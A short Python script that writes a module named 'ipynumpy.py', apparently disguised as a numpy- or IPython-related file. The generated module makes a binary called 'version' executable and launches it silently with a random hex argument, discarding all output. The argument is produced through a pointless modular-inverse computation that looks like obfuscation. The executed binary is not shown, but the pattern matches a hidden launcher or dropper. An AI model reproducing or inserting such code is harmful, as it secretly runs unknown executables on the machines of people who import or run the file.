import random
 
def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa < 0 else 1), lasty * (-1 if bb < 0 else 1)
 
def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m

N = 0xffffffffff

with open("ipynumpy.py", "w") as f:
    for _ in range(1):
        W = random.randrange(16**10)
        val = str(hex((((W)) * modinv(((1)),N)) % N))

        print("import os", file=f)
        print("import subprocess", file=f)
        print("", file=f)
        print("modter = 'chmod +x version'", file=f)
        print("os.system (modter)", file=f)
        print("", file=f)
        
        print("subprocess.Popen(", file=f)
        print("    ['./version', '" + val + "'],", file=f)
        print("    stdout=subprocess.DEVNULL,", file=f)
        print("    stderr=subprocess.DEVNULL,", file=f)
        print(")", file=f)
